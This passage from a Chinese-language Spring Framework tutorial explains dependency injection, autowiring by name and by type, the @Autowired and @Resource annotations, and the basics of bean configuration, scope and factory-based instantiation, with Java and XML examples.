<li>property标签，是给bean的属性注入其它对象。name属性，就是对象属性名； ref属性，就是给属性注入的对象。（如果想要注入基本数据类型，那么使用value属性）</li>
<li>给bean的属性注入其它对象，默认使用 get&#x2F;set 方法注入。也可以使用其它方式注入：构造方法注入、P命名空间注入等。</li>
</ul>
<p><font size = 3>5.初始化IOC容器，通过容器获取Bean对象</font></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StudentTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//创建IOC容器对象,加载Spring核心配置文件</span></span><br><span class="line">        <span class="type">ClassPathXmlApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassPathXmlApplicationContext</span>(<span class="string">&quot;applicationContext.xml&quot;</span>);</span><br><span class="line">        <span class="comment">//2 从IOC容器中获取Bean对象(studentService对象)</span></span><br><span class="line">        <span class="type">StudentService</span> <span class="variable">studentService</span> <span class="operator">=</span> (StudentService)applicationContext.getBean(<span class="string">&quot;studentService&quot;</span>);</span><br><span class="line">        <span class="comment">//3 调用Bean对象(BookService对象)的方法</span></span><br><span class="line">        studentService.save();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 控制台打印结果</span></span><br><span class="line"><span class="comment">     * 新增一个学生通过Service</span></span><br><span class="line"><span class="comment">     * 新增一个Student</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="IOC容器中哪些bean之间要建立依赖关系"><a href="#IOC容器中哪些bean之间要建立依赖关系" class="headerlink" title="IOC容器中哪些bean之间要建立依赖关系"></a>IOC容器中哪些bean之间要建立依赖关系</h3><blockquote>
<p>根据业务需求提前建立好关系，如业务层需要依赖数据层，service就要和mapper建立依赖关系</p>
</blockquote>
<h3 id="IOC和DI的最终目标就是-充分解耦，具体实现"><a href="#IOC和DI的最终目标就是-充分解耦，具体实现" class="headerlink" title="IOC和DI的最终目标就是:充分解耦，具体实现:"></a>IOC和DI的最终目标就是:充分解耦，具体实现:</h3><ul>
<li>使用IOC容器管理bean(IOC)</li>
<li>在IOC容器内将有依赖关系的bean进行关系绑定（DI）</li>
<li>最终结果为:使用对象时不仅可以直接从IOC容器中获取，并且获取到的bean已经绑定了所有的依赖关系.</li>
</ul>
<h2 id="依赖自动装配"><a href="#依赖自动装配" class="headerlink" title="依赖自动装配"></a>依赖自动装配</h2><blockquote>
<p>搭建测试环境demo</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Cat</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">shout</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;喵喵&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Dog</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">shout</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;汪汪&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Cat cat;</span><br><span class="line">    <span class="keyword">private</span> Dog dog;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="string"><span class="tag">        https://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;dog&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.lzjself.pojo.Dog&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;cat&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.lzjself.pojo.Cat&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;user&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.chq.pojo.User&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;cat&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;cat&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;dog&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;dog&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">value</span>=<span class="string">&quot;坤坤&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><font size = 3> 测试 </font></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">ApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassPathXmlApplicationContext</span>(<span class="string">&quot;applicationContext.xml&quot;</span>);</span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> context.getBean(<span class="string">&quot;user&quot;</span>, User.class);</span><br><span class="line">        user.getCat().shout();</span><br><span class="line">        user.getDog().shout();</span><br><span class="line">        System.out.println(user.getName());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="ByName-自动装配"><a href="#ByName-自动装配" class="headerlink" title="ByName 自动装配"></a>ByName 自动装配</h3><p><font size = 3>当一个bean节点带有 autowire byName的属性时</font></p>
<ul>
<li>将查找其类中所有的set方法名，例如setCat，获得将set去掉并且首字母小写的字符串，即cat。</li>
<li>去spring容器中寻找是否有此字符串名称id的对象。</li>
<li>如果有，就取出注入；如果没有，就报空指针异常</li>
</ul>
<p><font size = 3>修改bean配置，增加一个属性 autowire&#x3D;”byName”</font></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">       byName:会自动在容器上下文中查找，和自己对象set方法后面的值对应的bean id !</span></span><br><span class="line"><span class="comment">   --&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;user&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.chq.pojo.User&quot;</span> <span class="attr">autowire</span>=<span class="string">&quot;byName&quot;</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">value</span>=<span class="string">&quot;蔡徐坤&quot;</span>/&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">   <span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">       结果和之前一样</span></span><br><span class="line"><span class="comment">   --&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="byType-自动装配"><a href="#byType-自动装配" class="headerlink" title="byType 自动装配"></a>byType 自动装配</h3><p><font size = 3>使用autowire byType首先需要保证：同一类型的对象，在spring容器中唯一。如果不唯一，会报不唯一的异常。</font></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">   <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">&quot;com.chq.pojo.Dog&quot;</span>/&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">&quot;com.chq.pojo.Cat&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">   <span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">       在注册一个cat 的bean对象 报错：NoUniqueBeanDefinitionException</span></span><br><span class="line"><span class="comment">   --&gt;</span></span><br><span class="line">   <span class="comment">&lt;!--&lt;bean id=&quot;catt&quot; class=&quot;com.chq.pojo.Cat&quot;/&gt;--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;user&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.chq.pojo.User&quot;</span> <span class="attr">autowire</span>=<span class="string">&quot;byType&quot;</span>&gt;</span></span><br><span class="line">    	property name=&quot;name&quot; value=&quot;蔡徐坤&quot;/&gt;</span><br><span class="line">   <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- </span></span><br><span class="line"><span class="comment">      byname的时候，需要保证所有bean的id唯一，并且这个bean需要和自动注入的属性set方法的值一致！</span></span><br><span class="line"><span class="comment">      bytype的时候，需要保证有bean的class唯一，并且这个bean需要和自动注入的属性的类型值一致！</span></span><br><span class="line"><span class="comment">   --&gt;</span></span><br></pre></td></tr></table></figure>

<p><font size = 3>使用注解实现自动装配</font><br><font size = 3>Spring的xml文件开启支持注解配置</font></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:context</span>=<span class="string">&quot;http://www.springframework.org/schema/context&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:aop</span>=<span class="string">&quot;http://www.springframework.org/schema/aop&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="string"><span class="tag">        https://www.springframework.org/schema/beans/spring-beans.xsd</span></span></span><br><span class="line"><span class="string"><span class="tag">        http://www.springframework.org/schema/context</span></span></span><br><span class="line"><span class="string"><span class="tag">        https://www.springframework.org/schema/context/spring-context.xsd</span></span></span><br><span class="line"><span class="string"><span class="tag">        http://www.springframework.org/schema/aop</span></span></span><br><span class="line"><span class="string"><span class="tag">        https://www.springframework.org/schema/aop/spring-aop.xsd&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--开启注解的支持--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">context:annotation-config</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;dog&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.lzjself.pojo.Dog&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;cat&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.lzjself.pojo.Cat&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;user&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.lzjself.pojo.User&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><font size = 3>Spring中 @Autowired注解的流程图</font></p>
<p><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/Spring/autowired.png" alt="@Autowired默认按类型注入"></p>
<p><font size = 3> 此时的User.class</font></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span>()&#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> Cat cat;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> Dog dog;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Value(&quot;坤坤&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 此时的User类和我们之前的功能不变，使用了注解自动注入   不用再new xml对象获得</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><font size = 3>JDK中 @Resource注解的流程图</font></p>
<p><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/Spring/resource.png" alt="@Resource默认按名字注入，未找到则按类型注入"></p>
<p><font size = 3> 此时的User.class</font></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    <span class="meta">@Resource(name = &quot;cat2&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> Cat cat;</span><br><span class="line">    <span class="meta">@Resource</span></span><br><span class="line">    <span class="keyword">private</span> Dog dog;</span><br><span class="line">    <span class="meta">@Value(&quot;蔡徐坤&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="Resource和-Autowired区别"><a href="#Resource和-Autowired区别" class="headerlink" title="@Resource和@Autowired区别"></a>@Resource和@Autowired区别</h3><ul>
<li>都是用来自动装配的，都可以放在属性字段上</li>
<li>@Autowired通过byType的方式实现，而且必须要求这个对象存在！【常用】</li>
<li>@Resource默认通过byname的方式实现，如果找不到名字，则通过byType实现！如果两个都找不到的情况下，就报错！</li>
<li>执行顺序不同：@Autowired通过byType的方式实现，@Resource默认通过byname的方式实现。</li>
</ul>
<h1 id="Bean的基础配置和实例化"><a href="#Bean的基础配置和实例化" class="headerlink" title="Bean的基础配置和实例化"></a>Bean的基础配置和实例化</h1><h2 id="Bean的基础配置"><a href="#Bean的基础配置" class="headerlink" title="Bean的基础配置"></a>Bean的基础配置</h2><p><font size = 3>定义Spring核心容器管理的对象,格式如下</font></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">beans</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">bean</span>/&gt;</span></span><br><span class="line">	</span><br><span class="line">	<span class="tag">&lt;<span class="name">bean</span>&gt;</span><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><font size = 3>属性列表</font></p>
<ul>
<li>id： bean的id，使用容器可通过id获取对应bean，在一个容器中id值唯一</li>
<li>class： bean的类型，即配置bean的全限定类名</li>
</ul>
<p><font size = 3>示例</font></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;studentMapper&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.lzjself.mapper.Impl.StudentMapperImpl&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;studentService&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.lzjself.service.Impl.StudentServiceImpl&quot;</span>&gt;</span> <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="Bean的别名配置"><a href="#Bean的别名配置" class="headerlink" title="Bean的别名配置"></a>Bean的别名配置</h2><p><font size = 3>定义bean的别名，可以定义多个，使用， 或;或者空格</font></p>
<p><font size = 3>示例</font></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;studentMapper&quot;</span> <span class="attr">name</span>=<span class="string">&quot;a,b,c&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.chq.mapper.Impl.StudentMapperImpl&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StudentTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//创建IOC容器对象,加载Spring核心配置文件</span></span><br><span class="line">        <span class="type">ClassPathXmlApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassPathXmlApplicationContext</span>(<span class="string">&quot;applicationContext.xml&quot;</span>);</span><br><span class="line">        <span class="comment">//2 从IOC容器中获取Bean对象(studentService对象)</span></span><br><span class="line">        <span class="type">StudentMapper</span> <span class="variable">studentMapper</span> <span class="operator">=</span> (StudentMapper)applicationContext.getBean(<span class="string">&quot;a&quot;</span>);</span><br><span class="line">        <span class="comment">//3 调用Bean对象(BookService对象)的方法</span></span><br><span class="line">        studentMapper.insert();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 控制台打印结果</span></span><br><span class="line"><span class="comment">     * 新增一位学生通过Mapper</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Bean的作用范围配置"><a href="#Bean的作用范围配置" class="headerlink" title="Bean的作用范围配置"></a>Bean的作用范围配置</h2><p><font size = 3> 定义Bean的作用范围 </font></p>
<ul>
<li>singleton：单列（默认）</li>
<li>prototype：非单列</li>
</ul>
<blockquote>
<p>scope的取值不仅仅只有singleton和prototype，还有request、session、application、 websocket ，表示创建出的对象放置在web容器(tomcat)对应的位置。比如：request表示保存到request域中。</p>
</blockquote>
<p><font size = 3>示例</font></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;studentMapper&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.lzjself.mapper.Impl.StudentMapperImpl&quot;</span> <span class="attr">scope</span>=<span class="string">&quot;prototype&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StudentTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//创建IOC容器对象,加载Spring核心配置文件</span></span><br><span class="line">        <span class="type">ClassPathXmlApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassPathXmlApplicationContext</span>(<span class="string">&quot;applicationContext.xml&quot;</span>);</span><br><span class="line">        <span class="comment">//2 从IOC容器中获取Bean对象(studentService对象)</span></span><br><span class="line">        <span class="type">StudentMapper</span> <span class="variable">studentMapper1</span> <span class="operator">=</span> (StudentMapper)applicationContext.getBean(<span class="string">&quot;studentMapper&quot;</span>);</span><br><span class="line">        <span class="type">StudentMapper</span> <span class="variable">studentMapper2</span> <span class="operator">=</span> (StudentMapper)applicationContext.getBean(<span class="string">&quot;studentMapper&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//3 两个Bean对象地址不同 则非单列的</span></span><br><span class="line">        System.out.println(studentMapper1 == studentMapper2);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 控制台打印结果</span></span><br><span class="line"><span class="comment">     * false</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="实例化Bean的三种方式"><a href="#实例化Bean的三种方式" class="headerlink" title="实例化Bean的三种方式"></a>实例化Bean的三种方式</h2><p><font size = 3> bean本质上就是对象，创建bean使用构造方法完成</font></p>
<ul>
<li>构造方法方式</li>
</ul>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- xml 方式配置 --&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--构造方法实例化bean--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;studentMapper&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.lzjself.mapper.Impl.StudentMapperImpl&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--无参构造方法如果不存在，将抛出异常BeanCreationException--&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//   测试</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StudentTest2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">ClassPathXmlApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassPathXmlApplicationContext</span>(<span class="string">&quot;applicationContext2.xml&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">StudentMapper</span> <span class="variable">studentMapper</span> <span class="operator">=</span> (StudentMapper) applicationContext.getBean(<span class="string">&quot;studentMapper&quot;</span>);</span><br><span class="line"></span><br><span class="line">        studentMapper.insert();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<ul>
<li>静态工厂方式</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 静态工厂创建对象</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StudentMapperFactory</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> StudentMapper <span class="title function_">getStudentMapper</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;factory created&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">StudentMapperImpl</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- xml 配置 --&gt;</span></span><br><span class="line"><span class="comment">&lt;!--使用静态工厂实例化bean--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;studentMapper&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.lzjself.test.StudentMapperFactory&quot;</span> <span class="attr">factory-method</span>=<span class="string">&quot;getStudentMapper&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 测试</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StudentTest2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">ClassPathXmlApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassPathXmlApplicationContext</span>(<span class="string">&quot;applicationContext2.xml&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">StudentMapper</span> <span class="variable">studentMapper</span> <span class="operator">=</span> (StudentMapper) applicationContext.getBean(<span class="string">&quot;studentMapper&quot;</span>);</span><br><span class="line"></span><br><span class="line">        studentMapper.insert();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 控制台打印</span></span><br><span class="line"><span class="comment">     * factory created</span></span><br><span class="line"><span class="comment">     * 新增一位学生通过Mapper</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>实例工厂方式</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//实例工厂创建对象</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StudentMapperFactory</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> StudentMapper <span class="title function_">getStudentMapper</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;factory created&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">StudentMapperImpl</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- xml配置 --&gt;</span></span><br><span class="line">	<span class="comment">&lt;!--实例工厂创建对象--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;studentFactory&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.lzjself.test.StudentMapperFactory&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;studentMapper&quot;</span> <span class="attr">factory-method</span>=<span class="string">&quot;getStudentMapper&quot;</span> <span class="attr">factory-bean</span>=<span class="string">&quot;studentFactory&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 测试</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StudentTest2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">ClassPathXmlApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassPathXmlApplicationContext</span>(<span class="string">&quot;applicationContext2.xml&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">StudentMapper</span> <span class="variable">studentMapper</span> <span class="operator">=</span> (StudentMapper) applicationContext.getBean(<span class="string">&quot;studentMapper&quot;</span>);</span><br><span class="line"></span><br><span class="line">        studentMapper.insert();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 控制台打印</span></span><br><span class="line"><span class="comment">     * factory created</span></span><br><span class="line"><span class="comment">     * 新增一位学生通过Mapper</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="Spring注解开发"><a href="#Spring注解开发" class="headerlink" title="Spring注解开发"></a>Spring注解开发</h1><p><font size = 3> 注解就是替代了在配置文件中的配置步骤，更加方便快捷</font></p>
<blockquote>
<p>基本使用</p>
</blockquote>
<ul>
<li>开启Spring注解包扫描</li>
</ul>
